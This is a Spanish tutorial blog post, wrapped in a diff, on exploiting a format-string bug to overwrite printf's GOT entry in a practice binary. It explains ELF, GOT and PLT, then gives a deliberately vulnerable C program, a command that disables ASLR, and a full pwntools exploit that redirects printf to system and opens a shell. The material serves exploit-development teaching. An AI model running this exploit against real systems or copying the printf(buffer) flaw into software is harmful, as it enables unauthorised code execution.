@@ -1,0 +1,175 @@
+I"�8<p>En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string, sobresrcibiremos la direccion de GOT de printf</p>
+
+<h2 id="got-y-plt">GOT y PLT</h2>
+
+<p>Para entender esto mejor veremos la estructura de un binario ELF.</p>
+
+<p><img src="/assets/img/formatString-got/elf.png" alt="" /></p>
+
+<p>Ahora pondre otra estructura donde <code class="language-plaintext highlighter-rouge">section header table</code> apunta a la seccion <code class="language-plaintext highlighter-rouge">.text</code> , <code class="language-plaintext highlighter-rouge">.radata</code> y <code class="language-plaintext highlighter-rouge">.data</code> del binario, si se dan cuenta la estructura de arriba es mas extensa que la de abajo, esto es por que un archivo ELF tiene dos vistas, <code class="language-plaintext highlighter-rouge">Program header table</code> donde muestra los segmentos utilizados en tiempo de ejecución, y la otra es <code class="language-plaintext highlighter-rouge">section header table</code> que enumera el conjunto de secciones, simplemente en la imagen de arriba no se muesta explicitamente <code class="language-plaintext highlighter-rouge">section header table</code>, pero ambas estructuras son correctas</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|----------------------|
+|      ELF header      |
+|----------------------|
+| Program header table |
+|----------------------|
+|        .text         | &lt;--|
+|----------------------|    |
+|        .rodata       | &lt;--|
+|----------------------|    |
+|        .data         | &lt;--|
+|----------------------|    |
+| section header table | ---|
+|----------------------|
+
+</code></pre></div></div>
+<h3 id="direcciones-de-los-simbolos">Direcciones de los simbolos</h3>
+
+<p>En un binario ELF una seccion de texto necesita saber la direccion virtual absoluta de un simbolo (como por ejemplo una funcion o variable), esto surge de una operacion donde se toma una direccion o una entrada a PLT, por ejemplo una direccion puede ser esto:</p>
+
+<ul>
+  <li>Una constante de tiempo de enlace</li>
+  <li>La base de carga más una constante de tiempo de enlace.</li>
+</ul>
+
+<p>Si se dieron cuenta se menciona la palabra <code class="language-plaintext highlighter-rouge">enlace</code> y esto es por que GOT y PLT se encargan de la gran parte del enlazado dinamico.</p>
+
+<p>Imaginemos una situacion donde tomamos el valor de un simbolo, para poder realizar esto tenemos que hacer que el enlazador dinamico busque la direccion en memoria de ese simbolo y reescriba el codigo para solo poder carga una sola direccion, esto es demasiado proceso e incluso aumenta el tamaño del binario, asi que una mejora mucho mas eficiente y eficaz es reservar un espacio en la memoria del binario en la cual se mantendra la direccion de ese simbolo y posteriormente hacer que el enlazador dinamico ponga la direccion alli en lugar de reescribir todo el codigo, esto es gracias a que existe GOT, y GOT se encuenta en una seccion el binario que se llama .got, se puede ver en la primera imagen.</p>
+
+<h3 id="como-trabaja-got-y-plt">¿Como trabaja GOT y PLT?</h3>
+
+<p>GOT trabaja de la siguiente manera, primero GOT se abre como un enlazador dinamico durante la ejecucion del binario, posteriormente obtiene las direcciones absolutas de las funciones solicitadas y GOT se actualiza asi mismo segun lo que fue solicitado, despues toma las solicitudes de las ubicaciones que vienen por parte de PLT, una vez que esto se concluya tenemos el paso final en el cual PLT esta vinculado con la direccion de GOT, entonces ahora el binario puede llamar directamente a esa funcion que fue solicitada desde las librerias. Definitivamente GOT y PLT son los mejores amigos.</p>
+
+<h3 id="un-pequeño-ejemplo">Un pequeño ejemplo</h3>
+
+<p>El codigo del ejemplo es el siguiente, compilenlo como quieran, ese no es el que se va a explotar, simplemente solo es para ver como se representaria GOT y PLT en debugger:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+        <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Lo que hace este pequeño programa es obtener nuestro input y meterlo en el buffer de 8 bytes usando la funcion <code class="language-plaintext highlighter-rouge">gets</code> para posteriormente imprimirlo con la funcion <code class="language-plaintext highlighter-rouge">puts</code>, pasaremos a meter el binario a gdb y a mostrar el main</p>
+
+<p><img src="/assets/img/formatString-got/got%26plt.png" alt="" /></p>
+
+<p>Podemos visualizar algo como esto, donde se ve que tenemos dos entradas de PLT y ahora nuestas funciones de <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code> pasaron a <code class="language-plaintext highlighter-rouge">gets@plt</code> y <code class="language-plaintext highlighter-rouge">puts@plt</code> y esto es por que no se sabe con exactitud donde esta <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code>por lo que salta a PLT</p>
+
+<p><strong><em>A tomar en cuenta:</em></strong></p>
+
+<ul>
+  <li>
+    <p>En caso de que haya una entrada para <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code>, ambas funciones saltaran a la direccion que esta almacenada alli</p>
+  </li>
+  <li>
+    <p>Las direcciones en memoria de las funciones de libc, como <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code> estan almacenadas en GOT, ya que GOT es una gran tabla de direcciones</p>
+  </li>
+</ul>
+
+<h3 id="como-nos-podemos-aprovechar-de-esto">¿Como nos podemos aprovechar de esto?</h3>
+
+<p>Si tenemos una entrada PLT que sea de una funcion de libc, podemos redirigir la entrada PLT hacia otra parte</p>
+
+<h3 id="got-overwrite">GOT overwrite</h3>
+
+<p>Esta tecnica consiste en sobreecribir la direccion de GOT de una funcion por una direccion que nosotros queramos, por ejemplo en nuestro binario que vamos a explotar nos vamos a aprovechar de la funcion <code class="language-plaintext highlighter-rouge">printf</code>, entonces si sobreescribe la direccion GOT de <code class="language-plaintext highlighter-rouge">printf</code> por cualquier otra lo que va a pasar es que PLT va a adquirir la direccion GOT que sobreescribimos y ejecuta a lo que hayamos indicado.</p>
+
+<h2 id="analisis-del-binario">Analisis del binario</h2>
+
+<p>Primeramente desactivamos el ASRL con:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
+
+<p>El binario usado lo saque de: <code class="language-plaintext highlighter-rouge">https://ir0nstone.gitbook.io/notes/</code>, todo el credito para <code class="language-plaintext highlighter-rouge">Andrej (aka ir0nstone)</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">300</span><span class="p">];</span>
+    
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">vuln</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Lo que haces el binario es mantenerse en un bucle infinito recibiendo nuestros inputs con <code class="language-plaintext highlighter-rouge">fgets</code> y mostrandolos con <code class="language-plaintext highlighter-rouge">printf</code> asi que no podemos hacer BoF, si vemos las protecciones del binario lo unico que tenemos activado es PIE pero realmente no nos interesa si esta activado o no.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+</code></pre></div></div>
+
+<h2 id="calculando-el-offset-del-buffer-y-la-direccion-de-libc">Calculando el offset del buffer y la direccion de libc</h2>
+
+<h3 id="direccion-de-libc">Direccion de libc</h3>
+
+<p>Para esto solamente usaremos el comando ldd, y queda asi <code class="language-plaintext highlighter-rouge">ldd got_overwrite-32</code>, nos motrara algo como esto</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	linux-gate.so.1 (0xf7fc3000)
+	libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7c00000)
+	/lib/ld-linux.so.2 =&gt; /usr/lib/ld-linux.so.2 (0xf7fc5000)
+</code></pre></div></div>
+
+<p>Donde la direccion de libc es <code class="language-plaintext highlighter-rouge">0xf7c00000</code></p>
+
+<h3 id="calculando-el-offset-del-buffer">Calculando el offset del buffer</h3>
+
+<p>Viendo que se esta imprimiendo la variable buffer de esta forma <code class="language-plaintext highlighter-rouge">printf(buffer)</code> podemos hace uso de format string, de hecho si le pasamos unos cuantos format string lo que hara es buscar valores de la memoria e imprimirlos como vemos en la imagen</p>
+
+<p><img src="/assets/img/formatString-got/format1.png" alt="" /></p>
+
+<p>Para saber el offset el buffer tenemos que pasarle algunas A en conjunto de unos format string, de esta manera <code class="language-plaintext highlighter-rouge">AAAAAAAA %p %p %p %p %p %p %p</code> esto con el fin de ver desde donde se estan inprimiendo nuestras A, esto nos imprime lo siguiente</p>
+
+<p><img src="/assets/img/formatString-got/format2.png" alt="" /></p>
+
+<p>Entonces si empezamos a contar desde <code class="language-plaintext highlighter-rouge">0x12c</code> hasta donde tengo seleccionado en la imagen, nos da 5, entonces el offset del buffer es 5.</p>
+
+<h2 id="armando-nuestro-exploit">Armando nuestro exploit</h2>
+
+<p>El exploit queda de la siguiente manera</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./got_overwrite-32'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="mh">0xf7c00000</span>   
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./got_overwrite-32"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span> <span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]})</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Si vemos en esta parte</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
+</code></pre></div></div>
+
+<p>El numero 5 es el offset del buffer, lo que estamos haciendo aqui <code class="language-plaintext highlighter-rouge">elf.got['printf']</code> es sacar la direccion GOT de <code class="language-plaintext highlighter-rouge">printf</code> y sustuirla por la de system, y mas abajo se llama de esta manera <code class="language-plaintext highlighter-rouge">p.sendline('/bin/sh')</code> ya que es lo que queremos ejecutar</p>
+
+<p>Y ahora si ejecutamos el exploit debimos de obtener una shell</p>
+
+<p><img src="/assets/img/formatString-got/format4.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
